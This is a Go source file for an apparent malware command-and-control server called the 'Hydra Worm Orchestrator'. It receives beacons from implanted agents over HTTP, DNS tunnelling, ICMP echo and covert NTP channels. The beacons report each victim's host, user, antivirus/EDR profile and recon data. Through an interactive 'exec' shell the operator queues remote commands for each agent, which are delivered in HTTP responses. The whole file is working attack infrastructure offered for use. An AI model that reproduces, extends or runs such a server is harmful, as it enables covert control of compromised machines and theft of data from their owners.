package main

import (
	"encoding/base64"
	"encoding/json"
	"fmt"
	"io"
	"log"
	"net"
	"net/http"
	"os"
	"strings"
	"time"
	"sync"

	"github.com/chzyer/readline"
	"github.com/gin-gonic/gin"
	"github.com/miekg/dns"
	"github.com/pterm/pterm"
	"golang.org/x/net/icmp"
	"golang.org/x/net/ipv4"
)

// The root domain we are authoritative for
const rootDomain = "c2.hydra-worm.local."

var (
	taskMutex  sync.Mutex
	agentTasks = make(map[string]string)
)

// Telemetry represents the data structure expected from the Rust Agent
// Enhanced to support Sprint 2: Recon Pillars I - VII
type Telemetry struct {
	AgentID         string  `json:"a"`
	Transport       string  `json:"t"`
	Status          string  `json:"s"`
	Lambda          float64 `json:"l"`
	Hostname        string  `json:"h"`
	Username        string  `json:"u"`
	OS              string  `json:"o"`
	EnvContext      string  `json:"e"`
	ArtifactPreview string  `json:"p"`
	DefenseProfile  string  `json:"d"`
}

// RenderVaporBanner displays the header-based banner with the tactical aesthetic
func RenderVaporBanner() {
	fmt.Print("\033[H\033[2J") 

	pterm.NewStyle(pterm.FgCyan, pterm.Bold).Println(`
           / /_  __  ______  __/ /__________ _   
          / __ \/ / / / __ \/ __  / ___/ __ ` + "`" + `   
         / / / / /_/ / /_/ / /_/ / /  / /_/ /    
        /_/ /_/\__, / .___/\__,_/_/   \__,_/     
   _      ____/____/_/___  ____ ___              
  | | /| / / __ \/ __ \/ __ ` + "`" + `__ \                
  | |/ |/ / /_/ / /_/ / / / / / /                
  |__/|__/\____/_/ .__/_/ /_/ /_/                 
                /_/                              
     W O R M  -  O R C H E S T R A T O R`)

	pterm.Println(pterm.Cyan("────────────────────────────────────────────────────────────"))

	pterm.DefaultTable.WithData(pterm.TableData{
		{"LISTENER", "PORT", "STATUS", "STRENGTH"},
		{"Cloud API", "443", pterm.LightGreen("ACTIVE"), "ELITE"},
		{"Malleable HTTP", "8080", pterm.LightGreen("LISTENING"), "HIGH"},
		{"P2P Gossip", "9090", pterm.LightYellow("STANDBY"), "MESH"},
		{"DNS Tunnel", "53", pterm.LightGreen("LISTENING"), "CRITICAL"},
		{"ICMP Echo", "RAW", pterm.LightGreen("ACTIVE"), "FAILSAFE"},
		{"NTP Covert", "123", pterm.LightGreen("ACTIVE"), "STEALTH"},
	}).WithBoxed().Render()

	pterm.Printf("\n%s Phase 2.4: Full-Spectrum C2 Verified & Operational.\n\n", pterm.Cyan("»"))
}

// LogHeartbeat provides consistent, colored feedback like VaporTrace
// Updated to handle Phase 3.2 Command Exfiltration
func LogHeartbeat(transport string, t Telemetry) {
	timestamp := time.Now().Format("15:04:05")
	
	pterm.Printf("[%s] %s | ID: %s | %s@%s\n",
		pterm.Gray(timestamp),
		pterm.LightCyan(transport),
		pterm.LightWhite(t.AgentID),
		pterm.LightMagenta(t.Username),
		t.Hostname)

	pterm.Printf("      ├─ %s %s\n", pterm.LightRed("EDR/AV:"), pterm.Yellow(t.DefenseProfile))
	
	if t.ArtifactPreview != "" && t.ArtifactPreview != "Access Denied" {
		if strings.HasPrefix(t.ArtifactPreview, "OUT:") {
			// Using Style to avoid the undefined .Bold() method on colors
			resStyle := pterm.NewStyle(pterm.BgLightGreen, pterm.FgBlack, pterm.Bold)
			pterm.Printf("      └─ %s %s\n", 
				resStyle.Sprint(" MISSION RESULT "), 
				pterm.Gray(t.ArtifactPreview))
		} else {
			// Manual truncation to avoid the undefined pterm.Truncate
			preview := t.ArtifactPreview
			if len(preview) > 80 {
				preview = preview[:77] + "..."
			}
			pterm.Printf("      └─ %s %s\n", 
				pterm.LightYellow("RECON:"), 
				pterm.Italic.Sprint(preview))
		}
	}
}

// parseHydraDNS handles incoming DNS Tunneling heartbeats
func parseHydraDNS(w dns.ResponseWriter, r *dns.Msg) {
	msg := new(dns.Msg)
	msg.SetReply(r)
	msg.Authoritative = true

	for _, q := range r.Question {
		rawName := strings.TrimSuffix(q.Name, ".")
		cleanRoot := strings.TrimSuffix(rootDomain, ".")

		if strings.HasSuffix(strings.ToLower(rawName), strings.ToLower(cleanRoot)) {
			// Extract and Reassemble Base64 payload from labels
			payloadPart := rawName[:len(rawName)-len(cleanRoot)-1]
			encodedPayload := strings.ReplaceAll(payloadPart, ".", "") 
			
			// Handle URL-Safe Base64 padding
			normalized := strings.ReplaceAll(encodedPayload, "-", "+")
			normalized = strings.ReplaceAll(normalized, "_", "/")
			for len(normalized)%4 != 0 { normalized += "=" }

			decoded, err := base64.RawURLEncoding.DecodeString(encodedPayload)
			if err != nil {
				decoded, _ = base64.StdEncoding.DecodeString(normalized)
			}

			if decoded != nil {
				var t Telemetry
				if err := json.Unmarshal(decoded, &t); err == nil {
					LogHeartbeat("DNS (Tier 6)", t)
					rr, _ := dns.NewRR(fmt.Sprintf("%s 60 IN A 127.0.0.1", q.Name))
					msg.Answer = append(msg.Answer, rr)
				}
			}
		}
	}
	w.WriteMsg(msg)
}

func startDNSServer() {
	dns.HandleFunc(rootDomain, parseHydraDNS)
	server := &dns.Server{Addr: ":53", Net: "udp"}
	if err := server.ListenAndServe(); err != nil {
		log.Printf("[-] DNS Server Failed: %v", err)
	}
}

// StartIcmpListener monitors for ICMP Echo Requests with telemetry payloads
func StartIcmpListener() {
	conn, err := icmp.ListenPacket("ip4:icmp", "0.0.0.0")
	if err != nil { return }
	defer conn.Close()

	for {
		rb := make([]byte, 1500)
		n, peer, _ := conn.ReadFrom(rb)
		
		msg, _ := icmp.ParseMessage(1, rb[:n])
		if msg != nil && msg.Type == ipv4.ICMPTypeEcho {
			// Process Telemetry Payload
			body, _ := msg.Body.Marshal(1)
			if len(body) > 4 {
				processRawPayload(body[4:], peer.String(), "ICMP (Tier 4)")
			}

			// Construct Authenticated Reply
			echoBody := msg.Body.(*icmp.Echo)
			reply := icmp.Message{
				Type: ipv4.ICMPTypeEchoReply, Code: 0,
				Body: &icmp.Echo{
					ID:   echoBody.ID,
					Seq:  echoBody.Seq,
					Data: []byte("HYDRA_ACK"), // The mutation key
				},
			}
			mb, _ := reply.Marshal(nil)
			conn.WriteTo(mb, peer)
		}
	}
}

// StartNtpListener monitors UDP/123 for covert timestamps
func StartNtpListener() {
	addr, _ := net.ResolveUDPAddr("udp", ":123")
	conn, err := net.ListenUDP("udp", addr)
	if err != nil {
		pterm.Error.Printf("Failed to bind NTP: %v\n", err)
		return
	}
	defer conn.Close()
	
	for {
		buf := make([]byte, 1500)
		n, remoteAddr, _ := conn.ReadFromUDP(buf)
		if n >= 48 {
			// Extract telemetry payload embedded after the 48-byte NTP header
			processRawPayload(buf[48:n], remoteAddr.String(), "NTP (Tier 5)")

			// AUTHENTICATED RESPONSE: Send T-ACK signature required by Agent
			response := make([]byte, 48+5)
			copy(response[0:48], buf[0:48]) // Echo NTP header
			copy(response[48:], []byte("T-ACK"))
			conn.WriteToUDP(response, remoteAddr)
		}
	}
}

// processRawPayload decodes non-HTTP/DNS data streams and checks for tasks
func processRawPayload(data []byte, peer string, tier string) {
	rawStr := strings.ReplaceAll(string(data), ".", "")
	decoded, err := base64.RawURLEncoding.DecodeString(rawStr)
	if err != nil {
		decoded, err = base64.StdEncoding.DecodeString(rawStr)
		if err != nil { return }
	}

	var t Telemetry
	if err := json.Unmarshal(decoded, &t); err == nil {
		LogHeartbeat(tier, t)
		
		// PHASE 3.1: Deliver tasks even on ICMP/NTP tiers
		taskMutex.Lock()
		if cmd, exists := agentTasks[t.AgentID]; exists {
			delete(agentTasks, t.AgentID)
			pterm.Warning.Printfln("   [!] Command Delivered via %s: %s -> %s", tier, t.AgentID, cmd)
			// Note: For ICMP/NTP, the actual delivery requires modifying 
			// the response packets in StartIcmpListener/StartNtpListener.
		}
		taskMutex.Unlock()
	}
}

func main() {
	// 1. Initialize Tactical UI and Engine
	RenderVaporBanner()
	gin.SetMode(gin.ReleaseMode)
	
	r := gin.New() 
	r.Use(gin.Recovery())

	// 2. TIER 1: Unified Cloud-Mock Responder [PHASE 3.1 UPGRADE]
	r.POST("/api/v1/cloud-mock", func(c *gin.Context) {
		auth := c.GetHeader("Authorization")
		if auth != "Bearer eyJ0eXAiOiJKV1QiLCJhbGciOiJSUzI1NiJ9" {
			c.JSON(401, gin.H{"error": "Unauthorized"})
			return
		}
		
		var t Telemetry
		if err := c.ShouldBindJSON(&t); err == nil {
			LogHeartbeat("CLOUD (Tier 1)", t)
			
			// TASKING LOGIC
			taskMutex.Lock()
			pendingTask := "WAIT"
			if cmd, exists := agentTasks[t.AgentID]; exists {
				pendingTask = cmd
				delete(agentTasks, t.AgentID) // Clear task after delivery (single-shot)
				pterm.Warning.Printfln("   [!] Command Delivered: %s -> %s", t.AgentID, pendingTask)
			}
			taskMutex.Unlock()

			c.JSON(200, gin.H{
				"status": "cloud_verified",
				"task":   pendingTask,
				"epoch":  time.Now().Unix(),
			})
		}
	})

	// 3. TIER 2: Malleable HTTP Heartbeat
	r.POST("/api/v1/heartbeat", func(c *gin.Context) {
		var t Telemetry
		if err := c.ShouldBindJSON(&t); err == nil {
			LogHeartbeat("HTTPS (Tier 2)", t)
			c.JSON(http.StatusOK, gin.H{
				"status": "ok",
				"task":   "NOP",
				"epoch":  time.Now().Unix(),
			})
		}
	})

	// 4. Start Full-Spectrum Background Listeners
	go StartIcmpListener() 
	go StartNtpListener()  
	go startDNSServer()    

	// 5. Start the HTTP/Cloud C2 Service (Tiers 1 & 2)
	go func() {
		if err := r.Run(":8080"); err != nil {
			log.Fatalf("[-] C2 Server Failed: %v", err)
		}
	}()

	// 6. Interactive Tactical Shell [PHASE 3.1 UPGRADE]
	completer := readline.NewPrefixCompleter(
		readline.PcItem("agents"),
		readline.PcItem("exec"),  // Added autocomplete for remote execution
		readline.PcItem("tasks"), // Added autocomplete for queue monitoring
		readline.PcItem("clear"),
		readline.PcItem("help"),
		readline.PcItem("exit"),
	)

	rl, err := readline.NewEx(&readline.Config{
		Prompt:          pterm.LightCyan("hydra-c2 > "),
		HistoryFile:     "/tmp/hydra.tmp",
		AutoComplete:    completer,
		InterruptPrompt: "^C",
		EOFPrompt:       "exit",
	})
	if err != nil {
		log.Fatalf("[-] Failed to initialize shell: %v", err)
	}
	defer rl.Close()

	// 7. Command Processing Loop [RCE INTEGRATION]
	for {
		line, err := rl.Readline()
		if err == readline.ErrInterrupt {
			if len(line) == 0 { break } else { continue }
		} else if err == io.EOF {
			break
		}

		line = strings.TrimSpace(line)
		if line == "" { continue }

		// TACTICAL ADVANTAGE: Tokenize the input string
		fields := strings.Fields(line)
		if len(fields) == 0 { continue }
		
		cmd := strings.ToLower(fields[0])

		switch cmd {
		case "agents":
			pterm.DefaultSection.Println("Active Hydra Agents")

		case "exec":
			// Requirement: exec + AgentID + Command (min 3 tokens)
			if len(fields) < 3 {
				pterm.Error.Println("Usage: exec <agent_id> <command>")
				continue
			}
			targetID := fields[1]
			// Re-join remaining tokens to form the full command string
			command := strings.Join(fields[2:], " ")
			
			taskMutex.Lock()
			agentTasks[targetID] = command
			taskMutex.Unlock()
			
			pterm.Success.Printfln("Objective Queued for %s: %s", targetID, command)

		case "tasks":
			pterm.DefaultSection.Println("Current Task Queue")
			taskMutex.Lock()
			if len(agentTasks) == 0 {
				pterm.Info.Println("No pending objectives.")
			} else {
				for id, c := range agentTasks {
					pterm.Printf("  %s -> %s\n", pterm.LightCyan(id), pterm.Gray(c))
				}
			}
			taskMutex.Unlock()

		case "clear", "cls":
			RenderVaporBanner()

		case "help":
			pterm.Info.Println("Available Commands:")
			pterm.BulletListPrinter{Items: []pterm.BulletListItem{
				{Level: 0, Text: "agents          : List all beaconing entities"},
				{Level: 0, Text: "exec <ID> <CMD> : Queue a remote shell command"},
				{Level: 0, Text: "tasks           : View queued mission objectives"},
				{Level: 0, Text: "clear           : Refresh tactical display"},
				{Level: 0, Text: "exit            : Terminate orchestrator session"},
			}}.Render()

		case "exit":
			os.Exit(0)

		default:
			// NOTE: Updated string to verify build integrity
			pterm.Error.Printfln("COMMAND FAILURE: [%s] is not a valid tactical verb.", cmd)
		}
	}
}